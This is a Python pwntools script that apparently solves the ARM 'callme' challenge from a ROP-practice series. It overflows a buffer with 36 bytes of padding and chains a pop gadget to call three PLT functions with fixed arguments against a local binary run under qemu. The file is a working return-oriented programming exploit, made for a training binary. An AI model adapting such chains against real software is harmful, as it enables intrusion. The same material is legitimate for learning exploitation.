from pwn import *

context.arch = 'arm'
context.log_level = 'info'

pop_r0_r1_r2_lr_pc = 0x00010870

callme_one_plt   = 0x00010618
callme_two_plt   = 0x0001066c
callme_three_plt = 0x0001060c

OFFSET = 36

arg1 = 0xdeadbeef
arg2 = 0xcafebabe
arg3 = 0xd00df00d

def call_func(func_plt):
    p  = p32(arg1)          
    p += p32(arg2)              
    p += p32(arg3)               
    p += p32(pop_r0_r1_r2_lr_pc)
    p += p32(func_plt)           
    return p

payload  = b'A' * OFFSET

payload += p32(pop_r0_r1_r2_lr_pc)

payload += call_func(callme_one_plt)
payload += call_func(callme_two_plt)
payload += call_func(callme_three_plt)

p = process([
    'qemu-arm',
    '-L', '../split/armroot',
    './callme_armv5'
])

p.sendlineafter(b'>', payload)

print(p.recvall(timeout=3).decode(errors='replace'))
